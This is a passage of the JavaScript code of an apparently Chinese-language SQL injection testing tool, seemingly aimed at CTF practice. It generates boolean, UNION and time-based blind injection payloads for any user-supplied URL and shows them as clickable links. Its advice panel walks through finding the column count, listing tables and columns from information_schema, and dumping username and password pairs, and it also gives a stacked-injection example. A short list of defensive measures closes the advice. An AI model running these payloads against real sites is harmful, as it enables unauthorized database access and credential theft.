            description: '测试AND变体&&逻辑运算符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-OR变体(||)',
            payload: `${param.value}' || '1'='1'`,
            description: '测试OR变体||逻辑运算符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-不等于(<>))',
            payload: `${param.value}' <> '2'`,
            description: '测试不等于<>运算符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-LIKE',
            payload: `${param.value}' OR '1' LIKE '1'`,
            description: '测试LIKE操作符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-IN',
            payload: `${param.value}' OR 1 IN (1,2)`,
            description: '测试IN操作符',
            category: 'basic'
        },
        {
            name: '逻辑运算符-REGEXP',
            payload: `${param.value}' OR '1' REGEXP '1'`,
            description: '测试REGEXP操作符',
            category: 'basic'
        }
    ];
    
    syntaxes.forEach(syntax => {
        addSyntaxItem(url, param, syntax, container);
    });
}

// 生成UNION注入语法
function generateUnionSyntax(url, param, container) {
    const syntaxes = [
        {
            name: 'UNION注入-字段数检测',
            payload: `${param.value}' order by 1 -- `,
            description: '检测UNION注入的字段数',
            category: 'union'
        },
        {
            name: 'UNION注入-基本语法',
            payload: `${param.value}' union select 1,2,3 -- `,
            description: '基本的UNION注入语法，假设字段数为3',
            category: 'union'
        },
        {
            name: 'UNION注入-获取数据库名',
            payload: `${param.value}' union select 1,database(),3 -- `,
            description: '使用UNION注入获取当前数据库名',
            category: 'union'
        },
        {
            name: 'UNION注入-获取版本信息',
            payload: `${param.value}' union select 1,version(),3 -- `,
            description: '使用UNION注入获取数据库版本信息',
            category: 'union'
        },
        {
            name: 'UNION注入-获取用户信息',
            payload: `${param.value}' union select 1,user(),3 -- `,
            description: '使用UNION注入获取当前数据库用户',
            category: 'union'
        }
    ];
    
    syntaxes.forEach(syntax => {
        addSyntaxItem(url, param, syntax, container);
    });
}





// 生成时间盲注语法
function generateTimeSyntax(url, param, container) {
    // 获取用户选择的时间盲注
    const config = getTestConfig();
    const selectedBlindTechniques = config.blindInjectionTechniques;
    
    // 只有当用户选择了时间盲注时才生成时间盲注语法
    if (!selectedBlindTechniques.some(tech => tech.includes('time_blind'))) {
        return;
    }
    
    // 获取用户选择的注释变体
    const selectedVariants = config.commentVariants;
    // 获取盲注延迟时间
    const delay = config.blindInjectionDelay;
    
    // 所有支持的注入类型
    const injectionTypes = ['numeric', 'string_single', 'string_double', 'bracket_single', 'bracket_double'];
    
    // 生成时间盲注语法
    injectionTypes.forEach(injectionType => {
        selectedBlindTechniques.forEach(blindTechnique => {
            if (!blindTechnique.includes('time_blind')) return;
            
            selectedVariants.forEach(variant => {
                // 生成带注释变体的时间盲注payload
                const timePayloads = getTimePayloadWithComment(injectionType, param.value, delay, variant, blindTechnique);
                
                // 遍历返回的payload数组，为每个payload生成语法项
                timePayloads.forEach((timePayload, index) => {
                    const syntax = {
                        name: `时间盲注-${injectionType}-${blindTechnique}-${variant}-${index + 1}`,
                        payload: timePayload,
                        description: `针对${injectionType}类型的${blindTechnique}时间盲注语法，延迟${delay}秒 (格式${index + 1})`,
                        category: 'time'
                    };
                    
                    addSyntaxItem(url, param, syntax, container);
                });
            });
        });
    });
}

// 添加语法项到容器
function addSyntaxItem(url, param, syntax, container) {
    // 构建完整的测试URL
    const testUrl = buildTestUrlFromPayload(url, param, syntax.payload);
    
    // 创建语法项
    const syntaxItem = document.createElement('div');
    syntaxItem.className = `syntax-item fade-in syntax-${syntax.category}`;
    syntaxItem.dataset.category = syntax.category;
    
    syntaxItem.innerHTML = `
        <div class="syntax-header">
            <h6 class="syntax-title">${syntax.name}</h6>
            <div class="syntax-actions">
                <button class="btn btn-primary btn-sm copy-btn" onclick="copyToClipboard('${testUrl.replace(/'/g, "\\'")}')" title="复制完整URL">
                    <i class="fa fa-link" aria-hidden="true"></i>
                </button>
                <button class="btn btn-secondary btn-sm copy-btn" onclick="copyToClipboard('${syntax.payload.replace(/'/g, "\\'")}')" title="复制Payload">
                    <i class="fa fa-code" aria-hidden="true"></i>
                </button>
                <a href="${testUrl}" target="_blank" rel="noopener noreferrer" class="btn btn-info btn-sm" title="在新标签页打开">
                    <i class="fa fa-external-link" aria-hidden="true"></i>
                </a>
            </div>
        </div>
        <div class="syntax-code">${testUrl}</div>
        <div class="syntax-description">${syntax.description}</div>
    `;
    
    container.appendChild(syntaxItem);
}

// 从payload构建测试URL
function buildTestUrlFromPayload(url, param, payload) {
    const testUrl = new URL(url);
    const params = new URLSearchParams(testUrl.search);
    params.set(param.key, payload);
    testUrl.search = params.toString();
    return testUrl.toString();
}

// 生成注入建议
function generateInjectionAdvice() {
    const adviceContent = document.getElementById('adviceContent');
    
    // 清空之前的建议
    adviceContent.innerHTML = '';
    
    // 检查是否有注入点
    const totalFound = positiveResults + warningResults;
    if (totalFound === 0) {
        // 未发现注入点的建议
        const adviceItem = document.createElement('div');
        adviceItem.className = 'advice-item';
        adviceItem.innerHTML = `
            <h6 class="advice-title">未发现明显注入点</h6>
            <div class="advice-content">
                <p>本次测试未发现明显的SQL注入点，可能原因：</p>
                <ul>
                    <li>网站已采取了有效的SQL注入防护措施</li>
                    <li>测试参数选择不当</li>
                    <li>需要更复杂的注入技巧</li>
                    <li>测试深度不够</li>
                </ul>
                <p>建议：</p>
                <ul>
                    <li>尝试测试其他参数</li>
                    <li>选择高级测试深度</li>
                    <li>尝试其他注入类型</li>
                    <li>手动测试一些边缘情况</li>
                </ul>
            </div>
            <div class="advice-tags">
                <span class="advice-tag">防护良好</span>
                <span class="advice-tag">继续测试</span>
            </div>
        `;
        adviceContent.appendChild(adviceItem);
        return;
    }
    
    // 获取用户输入的URL和参数
    const userUrl = document.getElementById('urlInput').value.trim();
    const userParams = getParams();
    
    // 使用第一个参数作为示例参数
    const exampleParam = userParams[0] || { key: 'id', value: '1' };
    
    // 构建基础URL（不包含参数）
    let baseUrl = userUrl;
    try {
        const urlObj = new URL(userUrl);
        baseUrl = urlObj.origin + urlObj.pathname;
    } catch (e) {
        // 如果URL解析失败，使用原始URL
        baseUrl = userUrl;
    }
    
    // 构建示例URL的函数
    function buildExampleUrl(payload) {
        try {
            const url = new URL(baseUrl);
            const params = new URLSearchParams();
            params.set(exampleParam.key, payload);
            url.search = params.toString();
            return url.toString();
        } catch (e) {
            // 如果URL构建失败，返回简单拼接的URL
            return `${baseUrl}?${exampleParam.key}=${payload}`;
        }
    }
    
    // 发现注入点的建议
    const adviceItem = document.createElement('div');
    adviceItem.className = 'advice-item';
    adviceItem.innerHTML = `
        <h6 class="advice-title">发现可能的注入点</h6>
        <div class="advice-content">
            <p>本次测试共发现 ${totalFound} 个可能的注入点，其中：</p>
            <ul>
                <li>${positiveResults} 个高风险注入点</li>
                <li>${warningResults} 个可疑注入点</li>
            </ul>
            
            <h7 class="mt-3">📋 注入利用步骤与示例：</h7>
            <div class="mt-2">
                <h8 class="fw-bold">1. 确定字段数</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`${exampleParam.value}' order by 2 --+`)}</pre>
                <p class="text-muted small">说明：逐步增加数字，直到页面异常，即可确定字段总数</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">2. 查看字段输出位置</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`-1' union select 1,2,3 --+`)}</pre>
                <p class="text-muted small">说明：使用-1确保原查询无结果，观察页面<div>中显示的数字，确定哪个字段会显示在页面上</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">3. 获取当前数据库名</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`-1' union select 1,database(),3 --+`)}</pre>
                <p class="text-muted small">说明：将获取到的数据库名显示在页面<div>中</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">4. 获取所有表名</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`)}</pre>
                <p class="text-muted small">说明：获取当前数据库中的所有表名，显示在页面<div>中</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">5. 获取表的字段名</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+`)}</pre>
                <p class="text-muted small">说明：获取users表的所有字段名，显示在页面<div>中</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">6. 获取表数据</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`-1' union select 1,group_concat(username,':',password),3 from users --+`)}</pre>
                <p class="text-muted small">说明：获取users表中的用户名和密码，显示在页面<div>中</p>
            </div>
            
            <div class="mt-3">
                <h8 class="fw-bold">7. 堆叠注入示例（针对当前CTF题目）</h8>
                <pre class="bg-dark text-light p-2 rounded mt-1">${buildExampleUrl(`${exampleParam.value}';show databases;#`)}</pre>
                <p class="text-muted small">说明：使用堆叠注入显示所有数据库，结果会显示在页面<div>中</p>
            </div>
            
            <h7 class="mt-3">💡 实用技巧：</h7>
            <ul class="mt-2">
                <li>使用浏览器开发者工具（F12）查看<div>元素的内容</li>
                <li>右键查看页面源代码，查找<div>标签中的注入结果</li>
                <li>使用Burp Suite拦截响应，查看完整的注入结果</li>
                <li>注意URL编码，特殊字符需要正确编码（如空格→%20，单引号→%27）</li>
            </ul>
        </div>
        <div class="advice-tags">
            <span class="advice-tag">高风险</span>
            <span class="advice-tag">立即修复</span>
            <span class="advice-tag">深入测试</span>
        </div>
    `;
    adviceContent.appendChild(adviceItem);
    
    // 添加常见注入防护建议
    const protectionAdvice = document.createElement('div');
    protectionAdvice.className = 'advice-item';
    protectionAdvice.innerHTML = `
        <h6 class="advice-title">SQL注入防护建议</h6>
        <div class="advice-content">
            <p>为了防止SQL注入攻击，建议采取以下措施：</p>
            <ul>
                <li>使用参数化查询或预处理语句</li>
                <li>对输入进行严格的验证和过滤</li>
                <li>使用最小权限原则配置数据库用户</li>
                <li>部署Web应用防火墙(WAF)</li>
                <li>定期进行安全测试和代码审计</li>
                <li>避免在错误信息中泄露敏感信息</li>
                <li>使用ORM框架时注意其安全配置</li>
            </ul>
        </div>
        <div class="advice-tags">
            <span class="advice-tag">防护建议</span>
            <span class="advice-tag">安全编码</span>
        </div>
    `;
    adviceContent.appendChild(protectionAdvice);
}

// 过滤语法
function filterSyntax(category) {
    const syntaxItems = document.querySelectorAll('.syntax-item');
    const categoryBtns = document.querySelectorAll('.syntax-category-btn');
    
    // 更新按钮状态
    categoryBtns.forEach(btn => {
        btn.classList.remove('active');
    });
    document.querySelector(`[data-category="${category}"]`).classList.add('active');
    
    // 过滤语法项
    syntaxItems.forEach(item => {
        if (category === 'all' || item.dataset.category === category) {
            item.style.display = 'block';
        } else {
            item.style.display = 'none';
        }
    });
}

// 高级筛选 - 列筛选功能
function filterTableByColumn(columnIndex, filterValue) {
    // 保存筛选状态
    if (!window.filterState) {
        window.filterState = {};
    }
    window.filterState[columnIndex] = filterValue;
    
    // 重新应用所有筛选条件
    filterResults();
}

// 清空结果
function clearResults() {
    // 清空测试结果
    testResults = [];
    document.getElementById('resultsTableBody').innerHTML = '';
    
    // 清空注入语法
    document.getElementById('syntaxList').innerHTML = `
        <div class="syntax-empty text-center py-5">
            <i class="fa fa-code" aria-hidden="true" style="font-size: 48px; color: #ccc;"></i>
            <p class="mt-3 text-muted">输入URL并点击生成按钮，获取注入语法</p>
        </div>
    `;
    
    // 清空注入建议
    document.getElementById('adviceContent').innerHTML = `
        <div class="advice-empty text-center py-5">
            <i class="fa fa-lightbulb-o" aria-hidden="true" style="font-size: 48px; color: #ccc;"></i>
            <p class="mt-3 text-muted">完成测试后，将显示针对性的注入建议</p>
        </div>
    `;
    
    // 重置测试状态
    isTesting = false;
    updateTestButtonsState(false);
    
    // 重置测试统计
    totalTests = 0;
    currentTestIndex = 0;
    positiveResults = 0;
    warningResults = 0;
    
    // 重置分页状态
    currentPage = 1;
    pageSize = 100;
    filteredResults = [];
    paginatedResults = [];
    document.getElementById('pageSizeSelect').value = '100';
    
    // 重置筛选状态
    window.filterState = {};
    
    updateResultsDisplay();
    errorResults = 0;
    activeTests = 0;
    
    updateTestStats();
    updateProgress();
    
    // 显示空结果提示
    document.getElementById('emptyResults').style.display = 'block';
}

// 辅助函数：复制到剪贴板
function copyToClipboard(text) {
    if (navigator.clipboard) {
        navigator.clipboard.writeText(text);
    } else {
        // 兼容旧版浏览器
        const textArea = document.createElement('textarea');
        textArea.value = text;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();
        document.execCommand('copy');
        document.body.removeChild(textArea);
    }
}

// 辅助函数：显示Toast提示
function showToast(message, type = 'info') {
    // 创建Toast元素
    const toast = document.createElement('div');
    toast.className = `toast align-items-center text-white bg-${type} border-0 fade`;
    toast.role = 'alert';
    toast.setAttribute('aria-live', 'assertive');
    toast.setAttribute('aria-atomic', 'true');
    
    toast.innerHTML = `
        <div class="d-flex">
            <div class="toast-body">
                ${message}
            </div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Close"></button>
        </div>
    `;
    
    // 添加到文档
    document.body.appendChild(toast);
    
    // 显示Toast
    const toastBootstrap = new bootstrap.Toast(toast, {
        autohide: true,
        delay: 3000
    });
    toastBootstrap.show();
    
    // 显示后移除元素
    toast.addEventListener('hidden.bs.toast', () => {
        document.body.removeChild(toast);
    });
}

// 暂停测试
function pauseTest() {
    isPaused = !isPaused;
    
    // 更新暂停按钮文本和图标
    const pauseBtn = document.getElementById('pauseTestBtn');
    if (isPaused) {
        // 暂停时记录开始时间
        pauseStartTime = Date.now();
        pauseBtn.innerHTML = '<i class="fa fa-play" aria-hidden="true"></i> 继续测试';
        document.getElementById('progressText').textContent = `测试已暂停... ${currentTestIndex}/${totalTests}`;
    } else {
        // 恢复时计算暂停时长并累积
        if (pauseStartTime) {
            const pauseDuration = Date.now() - pauseStartTime;
            accumulatedPauseTime += pauseDuration;
            pauseStartTime = null;
        }
        pauseBtn.innerHTML = '<i class="fa fa-pause" aria-hidden="true"></i> 暂停测试';
        document.getElementById('progressText').textContent = `继续测试... ${currentTestIndex}/${totalTests}`;
        // 继续执行测试队列
        executeTestQueue();
    }
    
    // 更新测试时长
    updateProgress();
    
    // 更新按钮状态
    updateTestButtonsState(isTesting);
}

// 终止测试
function stopTest() {
    if (confirm('确定要终止测试吗？')) {
        // 停止测试
        isTesting = false;
        isPaused = false;
        testQueue = [];
        // 重置暂停相关变量
        accumulatedPauseTime = 0;
        pauseStartTime = null;
        
        // 更新进度文本
        document.getElementById('progressText').textContent = `测试已终止！已完成 ${currentTestIndex}/${totalTests}`;
        
        // 更新测试时长
        updateProgress();
        
        // 更新按钮状态
        updateTestButtonsState(false);
        
        showToast('测试已终止！', 'warning');
    }
}